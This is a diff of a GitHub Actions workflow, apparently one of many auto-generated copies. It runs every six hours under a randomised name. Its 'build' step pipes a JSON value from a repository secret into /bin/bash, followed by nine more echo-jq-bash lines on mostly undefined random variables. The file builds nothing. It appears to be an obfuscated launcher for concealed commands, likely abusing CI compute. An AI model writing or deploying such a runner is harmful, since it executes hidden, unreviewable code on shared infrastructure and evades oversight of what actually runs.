@@ -2,25 +2,23 @@ name: lilangzx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 5/6 * * *'
-
-jobs:  # 8307
+    - cron: '2 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: lilangzx
         env:
-          ka94: ${{ secrets.ka94 }}
+          titb47540: ${{ secrets.titb47540 }}
         run: |
-          echo $ka94 | jq -r .qyuv44464 | /bin/bash
-          echo $ightk06141 | jq -r .i4 | /bin/bash
-          echo $adwkd5816 | jq -r .p3567 | /bin/bash
-          echo $b553 | jq -r .ovubj9428 | /bin/bash
-          echo $iz2 | jq -r .xxka9 | /bin/bash
-          echo $eana52614 | jq -r .tcok02 | /bin/bash
-          echo $dp15055 | jq -r .ee6107 | /bin/bash
-          echo $fb45204 | jq -r .bfvuq99 | /bin/bash
-          echo $g96 | jq -r .n00108 | /bin/bash
-          echo $mjf3945 | jq -r .zmwpt13916 | /bin/bash
+          echo $titb47540 | jq -r .szdp464 | /bin/bash
+          echo $vg55 | jq -r .dyz8239 | /bin/bash
+          echo $lat867 | jq -r .vho964 | /bin/bash
+          echo $cvob4 | jq -r .hs7078 | /bin/bash
+          echo $nolbt7 | jq -r .igm45 | /bin/bash
+          echo $a186 | jq -r .gtbs5 | /bin/bash
+          echo $nfask163 | jq -r .v098 | /bin/bash
+          echo $df95065 | jq -r .gy28 | /bin/bash
+          echo $yajlf0 | jq -r .ok36 | /bin/bash
 
